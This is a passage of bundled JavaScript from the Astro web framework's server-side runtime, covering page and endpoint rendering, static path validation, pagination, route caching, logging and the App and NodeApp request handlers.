      if (nonAstroPageNeedsHeadInjection(componentFactory)) {
        for await (let chunk of maybeRenderHead(result)) {
          parts.append(chunk, result);
        }
      }
    });
    return new Response(bytes, {
      headers: new Headers([
        ["Content-Type", "text/html; charset=utf-8"],
        ["Content-Length", bytes.byteLength.toString()]
      ])
    });
  }
  const factoryReturnValue = await componentFactory(result, props, children);
  const factoryIsHeadAndContent = isHeadAndContent(factoryReturnValue);
  if (isRenderTemplateResult(factoryReturnValue) || factoryIsHeadAndContent) {
    await bufferHeadContent(result);
    const templateResult = factoryIsHeadAndContent ? factoryReturnValue.content : factoryReturnValue;
    let iterable = renderAstroTemplateResult(templateResult);
    let init = result.response;
    let headers = new Headers(init.headers);
    let body;
    if (streaming) {
      body = new ReadableStream({
        start(controller) {
          async function read() {
            let i = 0;
            try {
              for await (const chunk of iterable) {
                if (isHTMLString(chunk)) {
                  if (i === 0) {
                    if (!/<!doctype html/i.test(String(chunk))) {
                      controller.enqueue(encoder.encode("<!DOCTYPE html>\n"));
                    }
                  }
                }
                const bytes = chunkToByteArray(result, chunk);
                controller.enqueue(bytes);
                i++;
              }
              controller.close();
            } catch (e) {
              if (AstroError.is(e) && !e.loc) {
                e.setLocation({
                  file: route == null ? void 0 : route.component
                });
              }
              controller.error(e);
            }
          }
          read();
        }
      });
    } else {
      body = await iterableToHTMLBytes(result, iterable);
      headers.set("Content-Length", body.byteLength.toString());
    }
    let response = createResponse(body, { ...init, headers });
    return response;
  }
  if (!(factoryReturnValue instanceof Response)) {
    throw new AstroError({
      ...AstroErrorData.OnlyResponseCanBeReturned,
      message: AstroErrorData.OnlyResponseCanBeReturned.message(
        route == null ? void 0 : route.route,
        typeof factoryReturnValue
      ),
      location: {
        file: route == null ? void 0 : route.component
      }
    });
  }
  return factoryReturnValue;
}

function __astro_tag_component__(Component, rendererName) {
  if (!Component)
    return;
  if (typeof Component !== "function")
    return;
  Object.defineProperty(Component, Renderer, {
    value: rendererName,
    enumerable: false,
    writable: false
  });
}
function spreadAttributes(values, _name, { class: scopedClassName } = {}) {
  let output = "";
  if (scopedClassName) {
    if (typeof values.class !== "undefined") {
      values.class += ` ${scopedClassName}`;
    } else if (typeof values["class:list"] !== "undefined") {
      values["class:list"] = [values["class:list"], scopedClassName];
    } else {
      values.class = scopedClassName;
    }
  }
  for (const [key, value] of Object.entries(values)) {
    output += addAttribute(value, key, true);
  }
  return markHTMLString(output);
}

const dateTimeFormat = new Intl.DateTimeFormat([], {
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});
const levels = {
  debug: 20,
  info: 30,
  warn: 40,
  error: 50,
  silent: 90
};
function log(opts, level, type, message) {
  const logLevel = opts.level;
  const dest = opts.dest;
  const event = {
    type,
    level,
    message
  };
  if (levels[logLevel] > levels[level]) {
    return;
  }
  dest.write(event);
}
function warn(opts, type, message) {
  return log(opts, "warn", type, message);
}
function error(opts, type, message) {
  return log(opts, "error", type, message);
}
function debug(...args) {
  if ("_astroGlobalDebug" in globalThis) {
    globalThis._astroGlobalDebug(...args);
  }
}
if (typeof process !== "undefined") {
  if (process.argv.includes("--verbose")) ; else if (process.argv.includes("--silent")) ; else ;
}

const VALID_PARAM_TYPES = ["string", "number", "undefined"];
function validateGetStaticPathsParameter([key, value], route) {
  if (!VALID_PARAM_TYPES.includes(typeof value)) {
    throw new AstroError({
      ...AstroErrorData.GetStaticPathsInvalidRouteParam,
      message: AstroErrorData.GetStaticPathsInvalidRouteParam.message(key, value, typeof value),
      location: {
        file: route
      }
    });
  }
}
function validateDynamicRouteModule(mod, {
  ssr,
  logging,
  route
}) {
  if (ssr && mod.getStaticPaths) {
    warn(logging, "getStaticPaths", 'getStaticPaths() is ignored when "output: server" is set.');
  }
  if (!ssr && !mod.getStaticPaths) {
    throw new AstroError({
      ...AstroErrorData.GetStaticPathsRequired,
      location: { file: route.component }
    });
  }
}
function validateGetStaticPathsResult(result, logging, route) {
  if (!Array.isArray(result)) {
    throw new AstroError({
      ...AstroErrorData.InvalidGetStaticPathsReturn,
      message: AstroErrorData.InvalidGetStaticPathsReturn.message(typeof result),
      location: {
        file: route.component
      }
    });
  }
  result.forEach((pathObject) => {
    if (pathObject.params === void 0 || pathObject.params === null || pathObject.params && Object.keys(pathObject.params).length === 0) {
      throw new AstroError({
        ...AstroErrorData.GetStaticPathsExpectedParams,
        location: {
          file: route.component
        }
      });
    }
    if (typeof pathObject.params !== "object") {
      throw new AstroError({
        ...AstroErrorData.InvalidGetStaticPathParam,
        message: AstroErrorData.InvalidGetStaticPathParam.message(typeof pathObject.params),
        location: {
          file: route.component
        }
      });
    }
    for (const [key, val] of Object.entries(pathObject.params)) {
      if (!(typeof val === "undefined" || typeof val === "string" || typeof val === "number")) {
        warn(
          logging,
          "getStaticPaths",
          `invalid path param: ${key}. A string, number or undefined value was expected, but got \`${JSON.stringify(
            val
          )}\`.`
        );
      }
      if (typeof val === "string" && val === "") {
        warn(
          logging,
          "getStaticPaths",
          `invalid path param: ${key}. \`undefined\` expected for an optional param, but got empty string.`
        );
      }
    }
  });
}

function getParams(array) {
  const fn = (match) => {
    const params = {};
    array.forEach((key, i) => {
      if (key.startsWith("...")) {
        params[key.slice(3)] = match[i + 1] ? decodeURIComponent(match[i + 1]) : void 0;
      } else {
        params[key] = decodeURIComponent(match[i + 1]);
      }
    });
    return params;
  };
  return fn;
}
function stringifyParams(params, routeComponent) {
  const validatedParams = Object.entries(params).reduce((acc, next) => {
    validateGetStaticPathsParameter(next, routeComponent);
    const [key, value] = next;
    acc[key] = value == null ? void 0 : value.toString();
    return acc;
  }, {});
  return JSON.stringify(validatedParams, Object.keys(params).sort());
}

const SCRIPT_EXTENSIONS = /* @__PURE__ */ new Set([".js", ".ts"]);
const scriptRe = new RegExp(
  `\\.(${Array.from(SCRIPT_EXTENSIONS).map((s) => s.slice(1)).join("|")})($|\\?)`
);
const isScriptRequest = (request) => scriptRe.test(request);

const STYLE_EXTENSIONS = /* @__PURE__ */ new Set([
  ".css",
  ".pcss",
  ".postcss",
  ".scss",
  ".sass",
  ".styl",
  ".stylus",
  ".less"
]);
const cssRe = new RegExp(
  `\\.(${Array.from(STYLE_EXTENSIONS).map((s) => s.slice(1)).join("|")})($|\\?)`
);
const isCSSRequest = (request) => cssRe.test(request);

var __accessCheck$1 = (obj, member, msg) => {
  if (!member.has(obj))
    throw TypeError("Cannot " + msg);
};
var __privateGet$1 = (obj, member, getter) => {
  __accessCheck$1(obj, member, "read from private field");
  return getter ? getter.call(obj) : member.get(obj);
};
var __privateAdd$1 = (obj, member, value) => {
  if (member.has(obj))
    throw TypeError("Cannot add the same private member more than once");
  member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
};
var __privateSet$1 = (obj, member, value, setter) => {
  __accessCheck$1(obj, member, "write to private field");
  setter ? setter.call(obj, value) : member.set(obj, value);
  return value;
};
var _result, _slots, _loggingOpts;
const clientAddressSymbol$2 = Symbol.for("astro.clientAddress");
function onlyAvailableInSSR(name) {
  return function _onlyAvailableInSSR() {
    switch (name) {
      case "Astro.redirect":
        throw new AstroError(AstroErrorData.StaticRedirectNotAvailable);
    }
  };
}
function getFunctionExpression(slot) {
  var _a;
  if (!slot)
    return;
  if (((_a = slot.expressions) == null ? void 0 : _a.length) !== 1)
    return;
  return slot.expressions[0];
}
class Slots {
  constructor(result, slots, logging) {
    __privateAdd$1(this, _result, void 0);
    __privateAdd$1(this, _slots, void 0);
    __privateAdd$1(this, _loggingOpts, void 0);
    __privateSet$1(this, _result, result);
    __privateSet$1(this, _slots, slots);
    __privateSet$1(this, _loggingOpts, logging);
    if (slots) {
      for (const key of Object.keys(slots)) {
        if (this[key] !== void 0) {
          throw new AstroError({
            ...AstroErrorData.ReservedSlotName,
            message: AstroErrorData.ReservedSlotName.message(key)
          });
        }
        Object.defineProperty(this, key, {
          get() {
            return true;
          },
          enumerable: true
        });
      }
    }
  }
  has(name) {
    if (!__privateGet$1(this, _slots))
      return false;
    return Boolean(__privateGet$1(this, _slots)[name]);
  }
  async render(name, args = []) {
    if (!__privateGet$1(this, _slots) || !this.has(name))
      return;
    if (!Array.isArray(args)) {
      warn(
        __privateGet$1(this, _loggingOpts),
        "Astro.slots.render",
        `Expected second parameter to be an array, received a ${typeof args}. If you're trying to pass an array as a single argument and getting unexpected results, make sure you're passing your array as a item of an array. Ex: Astro.slots.render('default', [["Hello", "World"]])`
      );
    } else if (args.length > 0) {
      const slotValue = __privateGet$1(this, _slots)[name];
      const component = typeof slotValue === "function" ? await slotValue() : await slotValue;
      const expression = getFunctionExpression(component);
      if (expression) {
        const slot = expression(...args);
        return await renderSlot(__privateGet$1(this, _result), slot).then(
          (res) => res != null ? String(res) : res
        );
      }
      if (typeof component === "function") {
        return await renderJSX(__privateGet$1(this, _result), component(...args)).then(
          (res) => res != null ? String(res) : res
        );
      }
    }
    const content = await renderSlot(__privateGet$1(this, _result), __privateGet$1(this, _slots)[name]);
    const outHTML = stringifyChunk(__privateGet$1(this, _result), content);
    return outHTML;
  }
}
_result = new WeakMap();
_slots = new WeakMap();
_loggingOpts = new WeakMap();
let renderMarkdown = null;
function createResult(args) {
  const { markdown, params, pathname, renderers, request, resolve } = args;
  const url = new URL(request.url);
  const headers = new Headers();
  headers.set("Content-Type", "text/html");
  const response = {
    status: args.status,
    statusText: "OK",
    headers
  };
  Object.defineProperty(response, "headers", {
    value: response.headers,
    enumerable: true,
    writable: false
  });
  let cookies = void 0;
  const result = {
    styles: args.styles ?? /* @__PURE__ */ new Set(),
    scripts: args.scripts ?? /* @__PURE__ */ new Set(),
    links: args.links ?? /* @__PURE__ */ new Set(),
    propagation: args.propagation ?? /* @__PURE__ */ new Map(),
    propagators: /* @__PURE__ */ new Map(),
    extraHead: [],
    cookies,
    createAstro(astroGlobal, props, slots) {
      const astroSlots = new Slots(result, slots, args.logging);
      const Astro = {
        __proto__: astroGlobal,
        get clientAddress() {
          if (!(clientAddressSymbol$2 in request)) {
            if (args.adapterName) {
              throw new AstroError({
                ...AstroErrorData.ClientAddressNotAvailable,
                message: AstroErrorData.ClientAddressNotAvailable.message(args.adapterName)
              });
            } else {
              throw new AstroError(AstroErrorData.StaticClientAddressNotAvailable);
            }
          }
          return Reflect.get(request, clientAddressSymbol$2);
        },
        get cookies() {
          if (cookies) {
            return cookies;
          }
          cookies = new AstroCookies(request);
          result.cookies = cookies;
          return cookies;
        },
        params,
        props,
        request,
        url,
        redirect: args.ssr ? (path, status) => {
          return new Response(null, {
            status: status || 302,
            headers: {
              Location: path
            }
          });
        } : onlyAvailableInSSR("Astro.redirect"),
        resolve(path) {
          let extra = `This can be replaced with a dynamic import like so: await import("${path}")`;
          if (isCSSRequest(path)) {
            extra = `It looks like you are resolving styles. If you are adding a link tag, replace with this:
---
import "${path}";
---
`;
          } else if (isScriptRequest(path)) {
            extra = `It looks like you are resolving scripts. If you are adding a script tag, replace with this:

<script type="module" src={(await import("${path}?url")).default}><\/script>

or consider make it a module like so:

<script>
	import MyModule from "${path}";
<\/script>
`;
          }
          warn(
            args.logging,
            `deprecation`,
            `${bold(
              "Astro.resolve()"
            )} is deprecated. We see that you are trying to resolve ${path}.
${extra}`
          );
          return "";
        },
        response,
        slots: astroSlots
      };
      Object.defineProperty(Astro, "canonicalURL", {
        get: function() {
          warn(
            args.logging,
            "deprecation",
            `${bold("Astro.canonicalURL")} is deprecated! Use \`Astro.url\` instead.
Example:

---
const canonicalURL = new URL(Astro.url.pathname, Astro.site);
---
`
          );
          return new URL(this.request.url.pathname, this.site);
        }
      });
      Object.defineProperty(Astro, "__renderMarkdown", {
        enumerable: false,
        writable: false,
        value: async function(content, opts) {
          if (typeof Deno !== "undefined") {
            throw new Error("Markdown is not supported in Deno SSR");
          }
          if (!renderMarkdown) {
            let astroRemark = "@astrojs/";
            astroRemark += "markdown-remark";
            renderMarkdown = (await import(astroRemark)).renderMarkdown;
          }
          const { code } = await renderMarkdown(content, { ...markdown, ...opts ?? {} });
          return code;
        }
      });
      return Astro;
    },
    resolve,
    _metadata: {
      renderers,
      pathname,
      hasHydrationScript: false,
      hasRenderedHead: false,
      hasDirectives: /* @__PURE__ */ new Set()
    },
    response
  };
  return result;
}

function generatePaginateFunction(routeMatch) {
  return function paginateUtility(data, args = {}) {
    let { pageSize: _pageSize, params: _params, props: _props } = args;
    const pageSize = _pageSize || 10;
    const paramName = "page";
    const additionalParams = _params || {};
    const additionalProps = _props || {};
    let includesFirstPageNumber;
    if (routeMatch.params.includes(`...${paramName}`)) {
      includesFirstPageNumber = false;
    } else if (routeMatch.params.includes(`${paramName}`)) {
      includesFirstPageNumber = true;
    } else {
      throw new Error(
        `[paginate()] page number param \`${paramName}\` not found in your filepath.
Rename your file to \`[...page].astro\` or customize the param name via the \`paginate([], {param: '...'}\` option.`
      );
    }
    const lastPage = Math.max(1, Math.ceil(data.length / pageSize));
    const result = [...Array(lastPage).keys()].map((num) => {
      const pageNum = num + 1;
      const start = pageSize === Infinity ? 0 : (pageNum - 1) * pageSize;
      const end = Math.min(start + pageSize, data.length);
      const params = {
        ...additionalParams,
        [paramName]: includesFirstPageNumber || pageNum > 1 ? String(pageNum) : void 0
      };
      return {
        params,
        props: {
          ...additionalProps,
          page: {
            data: data.slice(start, end),
            start,
            end: end - 1,
            size: pageSize,
            total: data.length,
            currentPage: pageNum,
            lastPage,
            url: {
              current: routeMatch.generate({ ...params }),
              next: pageNum === lastPage ? void 0 : routeMatch.generate({ ...params, page: String(pageNum + 1) }),
              prev: pageNum === 1 ? void 0 : routeMatch.generate({
                ...params,
                page: !includesFirstPageNumber && pageNum - 1 === 1 ? void 0 : String(pageNum - 1)
              })
            }
          }
        }
      };
    });
    return result;
  };
}

async function callGetStaticPaths({
  isValidate,
  logging,
  mod,
  route,
  ssr
}) {
  validateDynamicRouteModule(mod, { ssr, logging, route });
  if (ssr) {
    return { staticPaths: Object.assign([], { keyed: /* @__PURE__ */ new Map() }) };
  }
  if (!mod.getStaticPaths) {
    throw new Error("Unexpected Error.");
  }
  let staticPaths = [];
  staticPaths = await mod.getStaticPaths({
    paginate: generatePaginateFunction(route),
    rss() {
      throw new AstroError(AstroErrorData.GetStaticPathsRemovedRSSHelper);
    }
  });
  if (Array.isArray(staticPaths)) {
    staticPaths = staticPaths.flat();
  }
  if (isValidate) {
    validateGetStaticPathsResult(staticPaths, logging, route);
  }
  const keyedStaticPaths = staticPaths;
  keyedStaticPaths.keyed = /* @__PURE__ */ new Map();
  for (const sp of keyedStaticPaths) {
    const paramsKey = stringifyParams(sp.params, route.component);
    keyedStaticPaths.keyed.set(paramsKey, sp);
  }
  return {
    staticPaths: keyedStaticPaths
  };
}
class RouteCache {
  constructor(logging, mode = "production") {
    this.cache = {};
    this.logging = logging;
    this.mode = mode;
  }
  clearAll() {
    this.cache = {};
  }
  set(route, entry) {
    if (this.mode === "production" && this.cache[route.component]) {
      warn(
        this.logging,
        "routeCache",
        `Internal Warning: route cache overwritten. (${route.component})`
      );
    }
    this.cache[route.component] = entry;
  }
  get(route) {
    return this.cache[route.component];
  }
}
function findPathItemByKey(staticPaths, params, route) {
  const paramsKey = stringifyParams(params, route.component);
  const matchedStaticPath = staticPaths.keyed.get(paramsKey);
  if (matchedStaticPath) {
    return matchedStaticPath;
  }
  debug("findPathItemByKey", `Unexpected cache miss looking for ${paramsKey}`);
}

var GetParamsAndPropsError = /* @__PURE__ */ ((GetParamsAndPropsError2) => {
  GetParamsAndPropsError2[GetParamsAndPropsError2["NoMatchingStaticPath"] = 0] = "NoMatchingStaticPath";
  return GetParamsAndPropsError2;
})(GetParamsAndPropsError || {});
async function getParamsAndProps(opts) {
  const { logging, mod, route, routeCache, pathname, ssr } = opts;
  let params = {};
  let pageProps;
  if (route && !route.pathname) {
    if (route.params.length) {
      const paramsMatch = route.pattern.exec(pathname);
      if (paramsMatch) {
        params = getParams(route.params)(paramsMatch);
      }
    }
    let routeCacheEntry = routeCache.get(route);
    if (!routeCacheEntry) {
      routeCacheEntry = await callGetStaticPaths({ mod, route, isValidate: true, logging, ssr });
      routeCache.set(route, routeCacheEntry);
    }
    const matchedStaticPath = findPathItemByKey(routeCacheEntry.staticPaths, params, route);
    if (!matchedStaticPath && !ssr) {
      return 0 /* NoMatchingStaticPath */;
    }
    pageProps = (matchedStaticPath == null ? void 0 : matchedStaticPath.props) ? { ...matchedStaticPath.props } : {};
  } else {
    pageProps = {};
  }
  return [params, pageProps];
}
async function renderPage(mod, ctx, env) {
  var _a, _b;
  const paramsAndPropsRes = await getParamsAndProps({
    logging: env.logging,
    mod,
    route: ctx.route,
    routeCache: env.routeCache,
    pathname: ctx.pathname,
    ssr: env.ssr
  });
  if (paramsAndPropsRes === 0 /* NoMatchingStaticPath */) {
    throw new AstroError({
      ...AstroErrorData.NoMatchingStaticPathFound,
      message: AstroErrorData.NoMatchingStaticPathFound.message(ctx.pathname),
      hint: ((_a = ctx.route) == null ? void 0 : _a.component) ? AstroErrorData.NoMatchingStaticPathFound.hint([(_b = ctx.route) == null ? void 0 : _b.component]) : ""
    });
  }
  const [params, pageProps] = paramsAndPropsRes;
  const Component = mod.default;
  if (!Component)
    throw new Error(`Expected an exported Astro component but received typeof ${typeof Component}`);
  const result = createResult({
    adapterName: env.adapterName,
    links: ctx.links,
    styles: ctx.styles,
    logging: env.logging,
    markdown: env.markdown,
    mode: env.mode,
    origin: ctx.origin,
    params,
    props: pageProps,
    pathname: ctx.pathname,
    propagation: ctx.propagation,
    resolve: env.resolve,
    renderers: env.renderers,
    request: ctx.request,
    site: env.site,
    scripts: ctx.scripts,
    ssr: env.ssr,
    status: ctx.status ?? 200
  });
  if (typeof mod.components === "object") {
    Object.assign(pageProps, { components: mod.components });
  }
  if (typeof mod.default === "function" && mod.default.name.startsWith("MDX")) {
    Object.assign(pageProps, {
      components: Object.assign((pageProps == null ? void 0 : pageProps.components) ?? {}, { Fragment })
    });
  }
  const response = await renderPage$1(
    result,
    Component,
    pageProps,
    null,
    env.streaming,
    ctx.route
  );
  if (result.cookies) {
    attachToResponse(response, result.cookies);
  }
  return response;
}

const clientAddressSymbol$1 = Symbol.for("astro.clientAddress");
function createAPIContext({
  request,
  params,
  site,
  props,
  adapterName
}) {
  return {
    cookies: new AstroCookies(request),
    request,
    params,
    site: site ? new URL(site) : void 0,
    generator: `Astro v${ASTRO_VERSION}`,
    props,
    redirect(path, status) {
      return new Response(null, {
        status: status || 302,
        headers: {
          Location: path
        }
      });
    },
    url: new URL(request.url),
    get clientAddress() {
      if (!(clientAddressSymbol$1 in request)) {
        if (adapterName) {
          throw new AstroError({
            ...AstroErrorData.ClientAddressNotAvailable,
            message: AstroErrorData.ClientAddressNotAvailable.message(adapterName)
          });
        } else {
          throw new AstroError(AstroErrorData.StaticClientAddressNotAvailable);
        }
      }
      return Reflect.get(request, clientAddressSymbol$1);
    }
  };
}
async function call(mod, env, ctx) {
  var _a, _b;
  const paramsAndPropsResp = await getParamsAndProps({
    mod,
    route: ctx.route,
    routeCache: env.routeCache,
    pathname: ctx.pathname,
    logging: env.logging,
    ssr: env.ssr
  });
  if (paramsAndPropsResp === GetParamsAndPropsError.NoMatchingStaticPath) {
    throw new AstroError({
      ...AstroErrorData.NoMatchingStaticPathFound,
      message: AstroErrorData.NoMatchingStaticPathFound.message(ctx.pathname),
      hint: ((_a = ctx.route) == null ? void 0 : _a.component) ? AstroErrorData.NoMatchingStaticPathFound.hint([(_b = ctx.route) == null ? void 0 : _b.component]) : ""
    });
  }
  const [params, props] = paramsAndPropsResp;
  const context = createAPIContext({
    request: ctx.request,
    params,
    props,
    site: env.site,
    adapterName: env.adapterName
  });
  const response = await renderEndpoint(mod, context, env.ssr);
  if (response instanceof Response) {
    attachToResponse(response, context.cookies);
    return {
      type: "response",
      response
    };
  }
  return {
    type: "simple",
    body: response.body,
    encoding: response.encoding,
    cookies: context.cookies
  };
}

let lastMessage;
let lastMessageCount = 1;
const consoleLogDestination = {
  write(event) {
    let dest = console.error;
    if (levels[event.level] < levels["error"]) {
      dest = console.log;
    }
    function getPrefix() {
      let prefix = "";
      let type = event.type;
      if (type) {
        prefix += dim(dateTimeFormat.format(new Date()) + " ");
        if (event.level === "info") {
          type = bold(cyan(`[${type}]`));
        } else if (event.level === "warn") {
          type = bold(yellow(`[${type}]`));
        } else if (event.level === "error") {
          type = bold(red(`[${type}]`));
        }
        prefix += `${type} `;
      }
      return reset(prefix);
    }
    let message = event.message;
    if (message === lastMessage) {
      lastMessageCount++;
      message = `${message} ${yellow(`(x${lastMessageCount})`)}`;
    } else {
      lastMessage = message;
      lastMessageCount = 1;
    }
    const outMessage = getPrefix() + message;
    dest(outMessage);
    return true;
  }
};

function appendForwardSlash$1(path) {
  return path.endsWith("/") ? path : path + "/";
}
function prependForwardSlash(path) {
  return path[0] === "/" ? path : "/" + path;
}
function removeTrailingForwardSlash(path) {
  return path.endsWith("/") ? path.slice(0, path.length - 1) : path;
}
function trimSlashes(path) {
  return path.replace(/^\/|\/$/g, "");
}
function isString(path) {
  return typeof path === "string" || path instanceof String;
}
function joinPaths(...paths) {
  return paths.filter(isString).map(trimSlashes).join("/");
}

function createRenderContext(options) {
  const request = options.request;
  const url = new URL(request.url);
  const origin = options.origin ?? url.origin;
  const pathname = options.pathname ?? url.pathname;
  return {
    ...options,
    origin,
    pathname,
    url
  };
}

function createEnvironment(options) {
  return options;
}

function getRootPath(base) {
  return appendForwardSlash$1(new URL(base || "/", "http://localhost/").pathname);
}
function joinToRoot(href, base) {
  return npath.posix.join(getRootPath(base), href);
}
function createLinkStylesheetElement(href, base) {
  return {
    props: {
      rel: "stylesheet",
      href: joinToRoot(href, base)
    },
    children: ""
  };
}
function createLinkStylesheetElementSet(hrefs, base) {
  return new Set(hrefs.map((href) => createLinkStylesheetElement(href, base)));
}
function createModuleScriptElement(script, base) {
  if (script.type === "external") {
    return createModuleScriptElementWithSrc(script.value, base);
  } else {
    return {
      props: {
        type: "module"
      },
      children: script.value
    };
  }
}
function createModuleScriptElementWithSrc(src, site) {
  return {
    props: {
      type: "module",
      src: joinToRoot(src, site)
    },
    children: ""
  };
}

function matchRoute(pathname, manifest) {
  return manifest.routes.find((route) => route.pattern.test(pathname));
}
function matchAssets(route, assets) {
  for (const asset of assets) {
    if (!asset.endsWith(".html"))
      continue;
    if (route.pattern.test(asset)) {
      return asset;
    }
    if (route.pattern.test(asset.replace(/index\.html$/, ""))) {
      return asset;
    }
  }
}

var __accessCheck = (obj, member, msg) => {
  if (!member.has(obj))
    throw TypeError("Cannot " + msg);
};
var __privateGet = (obj, member, getter) => {
  __accessCheck(obj, member, "read from private field");
  return getter ? getter.call(obj) : member.get(obj);
};
var __privateAdd = (obj, member, value) => {
  if (member.has(obj))
    throw TypeError("Cannot add the same private member more than once");
  member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
};
var __privateSet = (obj, member, value, setter) => {
  __accessCheck(obj, member, "write to private field");
  setter ? setter.call(obj, value) : member.set(obj, value);
  return value;
};
var __privateMethod = (obj, member, method) => {
  __accessCheck(obj, member, "access private method");
  return method;
};
var _env, _manifest$1, _manifestData, _routeDataToRouteInfo, _encoder, _logging, _base, _baseWithoutTrailingSlash, _renderPage, renderPage_fn, _callEndpoint, callEndpoint_fn;
class App {
  constructor(manifest, streaming = true) {
    __privateAdd(this, _renderPage);
    __privateAdd(this, _callEndpoint);
    __privateAdd(this, _env, void 0);
    __privateAdd(this, _manifest$1, void 0);
    __privateAdd(this, _manifestData, void 0);
    __privateAdd(this, _routeDataToRouteInfo, void 0);
    __privateAdd(this, _encoder, new TextEncoder());
    __privateAdd(this, _logging, {
      dest: consoleLogDestination,
      level: "info"
    });
    __privateAdd(this, _base, void 0);
    __privateAdd(this, _baseWithoutTrailingSlash, void 0);
    __privateSet(this, _manifest$1, manifest);
    __privateSet(this, _manifestData, {
      routes: manifest.routes.map((route) => route.routeData)
    });
    __privateSet(this, _routeDataToRouteInfo, new Map(manifest.routes.map((route) => [route.routeData, route])));
    __privateSet(this, _env, createEnvironment({
      adapterName: manifest.adapterName,
      logging: __privateGet(this, _logging),
      markdown: manifest.markdown,
      mode: "production",
      renderers: manifest.renderers,
      async resolve(specifier) {
        if (!(specifier in manifest.entryModules)) {
          throw new Error(`Unable to resolve [${specifier}]`);
        }
        const bundlePath = manifest.entryModules[specifier];
        switch (true) {
          case bundlePath.startsWith("data:"):
          case bundlePath.length === 0: {
            return bundlePath;
          }
          default: {
            return prependForwardSlash(joinPaths(manifest.base, bundlePath));
          }
        }
      },
      routeCache: new RouteCache(__privateGet(this, _logging)),
      site: __privateGet(this, _manifest$1).site,
      ssr: true,
      streaming
    }));
    __privateSet(this, _base, __privateGet(this, _manifest$1).base || "/");
    __privateSet(this, _baseWithoutTrailingSlash, removeTrailingForwardSlash(__privateGet(this, _base)));
  }
  removeBase(pathname) {
    if (pathname.startsWith(__privateGet(this, _base))) {
      return pathname.slice(__privateGet(this, _baseWithoutTrailingSlash).length + 1);
    }
    return pathname;
  }
  match(request, { matchNotFound = false } = {}) {
    const url = new URL(request.url);
    if (__privateGet(this, _manifest$1).assets.has(url.pathname)) {
      return void 0;
    }
    let pathname = "/" + this.removeBase(url.pathname);
    let routeData = matchRoute(pathname, __privateGet(this, _manifestData));
    if (routeData) {
      const asset = matchAssets(routeData, __privateGet(this, _manifest$1).assets);
      if (asset)
        return void 0;
      return routeData;
    } else if (matchNotFound) {
      return matchRoute("/404", __privateGet(this, _manifestData));
    } else {
      return void 0;
    }
  }
  async render(request, routeData) {
    let defaultStatus = 200;
    if (!routeData) {
      routeData = this.match(request);
      if (!routeData) {
        defaultStatus = 404;
        routeData = this.match(request, { matchNotFound: true });
      }
      if (!routeData) {
        return new Response(null, {
          status: 404,
          statusText: "Not found"
        });
      }
    }
    if (routeData.route === "/404") {
      defaultStatus = 404;
    }
    let mod = __privateGet(this, _manifest$1).pageMap.get(routeData.component);
    if (routeData.type === "page") {
      let response = await __privateMethod(this, _renderPage, renderPage_fn).call(this, request, routeData, mod, defaultStatus);
      if (response.status === 500) {
        const fiveHundredRouteData = matchRoute("/500", __privateGet(this, _manifestData));
        if (fiveHundredRouteData) {
          mod = __privateGet(this, _manifest$1).pageMap.get(fiveHundredRouteData.component);
          try {
            let fiveHundredResponse = await __privateMethod(this, _renderPage, renderPage_fn).call(this, request, fiveHundredRouteData, mod, 500);
            return fiveHundredResponse;
          } catch {
          }
        }
      }
      return response;
    } else if (routeData.type === "endpoint") {
      return __privateMethod(this, _callEndpoint, callEndpoint_fn).call(this, request, routeData, mod, defaultStatus);
    } else {
      throw new Error(`Unsupported route type [${routeData.type}].`);
    }
  }
  setCookieHeaders(response) {
    return getSetCookiesFromResponse(response);
  }
}
_env = new WeakMap();
_manifest$1 = new WeakMap();
_manifestData = new WeakMap();
_routeDataToRouteInfo = new WeakMap();
_encoder = new WeakMap();
_logging = new WeakMap();
_base = new WeakMap();
_baseWithoutTrailingSlash = new WeakMap();
_renderPage = new WeakSet();
renderPage_fn = async function(request, routeData, mod, status = 200) {
  const url = new URL(request.url);
  const pathname = "/" + this.removeBase(url.pathname);
  const info = __privateGet(this, _routeDataToRouteInfo).get(routeData);
  const links = createLinkStylesheetElementSet(info.links);
  let scripts = /* @__PURE__ */ new Set();
  for (const script of info.scripts) {
    if ("stage" in script) {
      if (script.stage === "head-inline") {
        scripts.add({
          props: {},
          children: script.children
        });
      }
    } else {
      scripts.add(createModuleScriptElement(script));
    }
  }
  try {
    const ctx = createRenderContext({
      request,
      origin: url.origin,
      pathname,
      scripts,
      links,
      route: routeData,
      status
    });
    const response = await renderPage(mod, ctx, __privateGet(this, _env));
    return response;
  } catch (err) {
    error(__privateGet(this, _logging), "ssr", err.stack || err.message || String(err));
    return new Response(null, {
      status: 500,
      statusText: "Internal server error"
    });
  }
};
_callEndpoint = new WeakSet();
callEndpoint_fn = async function(request, routeData, mod, status = 200) {
  const url = new URL(request.url);
  const pathname = "/" + this.removeBase(url.pathname);
  const handler = mod;
  const ctx = createRenderContext({
    request,
    origin: url.origin,
    pathname,
    route: routeData,
    status
  });
  const result = await call(handler, __privateGet(this, _env), ctx);
  if (result.type === "response") {
    if (result.response.headers.get("X-Astro-Response") === "Not-Found") {
      const fourOhFourRequest = new Request(new URL("/404", request.url));
      const fourOhFourRouteData = this.match(fourOhFourRequest);
      if (fourOhFourRouteData) {
        return this.render(fourOhFourRequest, fourOhFourRouteData);
      }
    }
    return result.response;
  } else {
    const body = result.body;
    const headers = new Headers();
    const mimeType = mime.getType(url.pathname);
    if (mimeType) {
      headers.set("Content-Type", `${mimeType};charset=utf-8`);
    } else {
      headers.set("Content-Type", "text/plain;charset=utf-8");
    }
    const bytes = __privateGet(this, _encoder).encode(body);
    headers.set("Content-Length", bytes.byteLength.toString());
    const response = new Response(bytes, {
      status: 200,
      headers
    });
    attachToResponse(response, result.cookies);
    return response;
  }
};

const clientAddressSymbol = Symbol.for("astro.clientAddress");
function createRequestFromNodeRequest(req, body) {
  var _a;
  let url = `http://${req.headers.host}${req.url}`;
  let rawHeaders = req.headers;
  const entries = Object.entries(rawHeaders);
  const method = req.method || "GET";
  let request = new Request(url, {
    method,
    headers: new Headers(entries),
    body: ["HEAD", "GET"].includes(method) ? null : body
  });
  if ((_a = req.socket) == null ? void 0 : _a.remoteAddress) {
    Reflect.set(request, clientAddressSymbol, req.socket.remoteAddress);
  }
  return request;
}
class NodeApp extends App {
  match(req, opts = {}) {
    return super.match(req instanceof Request ? req : createRequestFromNodeRequest(req), opts);
  }
  render(req, routeData) {
    if ("on" in req) {
      let body = Buffer.from([]);
      let reqBodyComplete = new Promise((resolve, reject) => {
        req.on("data", (d) => {
